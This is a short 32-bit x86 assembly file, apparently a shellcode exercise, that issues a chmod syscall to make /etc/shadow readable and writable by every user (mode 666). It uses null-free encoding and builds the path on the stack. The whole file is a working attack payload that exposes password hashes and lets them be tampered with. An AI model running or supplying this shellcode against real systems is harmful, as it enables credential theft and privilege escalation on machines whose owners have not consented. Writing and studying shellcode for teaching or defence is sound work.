; Author:	Trisna Quebe
; shellcode for changing the permissions of the /etc/shadow file.
; we change the permissions to 666 / -rw-rw-rw
; 32 bit

global _start
section .text

_start:
	; chmod(const char *pathname, mode_t mode); -> syscall number 15
	; normally: -rw-r----- 1 root shadow 1763 jan 28 23:38 /etc/shadow

	xor eax, eax		; zero out eax
	mov al, 0xf 		; chmod

	xor edx, edx
	push edx		; string terminator

	; //etc/shadow
	push 0x776f6461
	push 0x68732f63
	push 0x74652f2f
	mov ebx, esp		; get the string from the stack

	mov cx, 0666o		; 666 mode
	int 0x80
